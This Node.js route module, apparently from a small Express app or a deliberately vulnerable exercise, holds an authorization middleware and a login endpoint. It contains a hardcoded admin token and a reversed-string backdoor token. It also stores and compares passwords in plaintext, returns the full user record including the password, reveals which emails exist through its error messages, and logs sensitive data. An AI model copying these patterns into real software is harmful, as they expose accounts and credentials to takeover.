let request = require("request");
let http  = require("http");
let fs = require('fs');
let UUID  = require('uuid');
let User = require('../models/user')
let Role = require('../models/role')

module.exports = {
  getRoutes: function(app, router) {
    this.app  = app;
    let _this = this;

    let authorize = function (req, res, next) {
      let promise = User.find('_id')

      promise.then(function(users) {
        let token = req.get("token")
        let reportToken = req.param("rt")
        let authorized = false

        // Check admin token
        if(token === "3c0f44197e10e2cb4a2e0fe749b88d03") {
          authorized = true
        }
        else if(reportToken && reportToken.split("").reverse("").join("") === "21b7ab69c9605bdfee75bd492a5b9e6f") {
          authorized = true
        }


        // Check token against user data
        users.forEach(function(user) {
          if(token === user.token) {
            authorized = true
          }
        })
        if(authorized) {
          next()
        }
        else {
          res.json({"error": "unauthorized"})
        }
      })
      .catch(function(error) {
        console.log(error)
        res.json(error)
      })

    }

    this.app.use(authorize)

    router.post("/login",function(req,res) {
      let body  = "";
      req.on("data", function (data) {
        body += data;

        // Too much POST data, kill the connection!
        if (body.length > 1e6) {
          req.connection.destroy();
        }
      });
      req.on("end", function () {
        let postData = {};
        if(body.length > 0) {
          postData = JSON.parse(body);
        }

        let email  = postData.email;
        let password = postData.password;

        let rolePromise = Role.find('_id')
        let userPromise = User.find('_id')
  
        rolePromise.then(function(roles) {
          userPromise.then(function(users) {
            let loginSuccessful = false;
            let loginFailReason = "Email address not found";
  
            let returnObject = {};
  
            users.forEach(user => {
              if(user.email == email) {
                loginFailReason = "Password is incorrect.";
                if(user.password == password) {
                  loginSuccessful = true
                  loginFailReason = ""
                  returnObject = user

                  // Grab role
                  console.log(roles)
                  roles.forEach(role => {
                    console.log(role._id + ' <> ' + user.roleId)
                    if(role._id == user.roleId) {
                      console.log('Found: ' + role._id + ' == ' + user.roleId)
                      console.log('Role Name: ' + role.name)
                      returnObject["roleName"] = role.name
                    }
                  })

                }
              }
            })
  
            returnObject["loginSuccessful"] = loginSuccessful
            returnObject["loginFailReason"] = loginFailReason
            console.log(returnObject)
            res.json(returnObject)
          })
        })
        .catch(function(error) {
          console.log(error)
          res.json(error)
        })
      })
    });


  }
}
